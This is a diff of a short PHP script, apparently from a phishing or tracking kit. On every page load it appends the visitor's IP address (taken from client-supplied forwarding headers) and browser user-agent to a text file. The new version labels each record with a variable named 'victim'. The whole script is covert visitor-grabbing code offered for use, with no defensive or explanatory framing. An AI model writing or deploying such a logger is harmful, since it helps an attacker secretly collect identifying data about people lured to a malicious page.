@@ -1,49 +1,29 @@
 <?php
 
-$ip = getRealIP ();
-
-
-    function getRealIP(){
-
-        if (isset($_SERVER["HTTP_CLIENT_IP"])){
-
-            return $_SERVER["HTTP_CLIENT_IP"];
-
-        }elseif (isset($_SERVER["HTTP_X_FORWARDED_FOR"])){
-
-            return $_SERVER["HTTP_X_FORWARDED_FOR"];
-
-        }elseif (isset($_SERVER["HTTP_X_FORWARDED"])){
-
-            return $_SERVER["HTTP_X_FORWARDED"];
-
-        }elseif (isset($_SERVER["HTTP_FORWARDED_FOR"])){
-
-            return $_SERVER["HTTP_FORWARDED_FOR"];
-
-        }elseif (isset($_SERVER["HTTP_FORWARDED"])){
-
-            return $_SERVER["HTTP_FORWARDED"];
-
-        }else{
-
-            return $_SERVER["REMOTE_ADDR"];
-                                                                                                             }
+if (!empty($_SERVER['HTTP_CLIENT_IP']))
+    {
+      $ipaddress = $_SERVER['HTTP_CLIENT_IP']."\r\n";
     }
+elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
+    {
+      $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR']."\r\n";
+    }
+else
+    {
+      $ipaddress = $_SERVER['REMOTE_ADDR']."\r\n";
+    }
+$useragent = " User-Agent: ";
+$browser = $_SERVER['HTTP_USER_AGENT'];
 
 
+$file = 'ip.txt';
+$victim = "IP: ";
+$fp = fopen($file, 'a');
+
+fwrite($fp, $victim);
+fwrite($fp, $ipaddress);
+fwrite($fp, $useragent);
+fwrite($fp, $browser);
 
 
 fclose($fp);
-
-
-
-//$useragent = " User-Agent: ";
-$browser = $_SERVER['HTTP_USER_AGENT'];
-
-$archivo = fopen("ips.txt","a");
-$datos= "\n"."\n"."####################"."\n"."\n"."IP: ".$ip."\r\n"."User-Agent: ".$browser;
-fwrite($archivo,$datos);
-fclose($archivo);
-
-?>
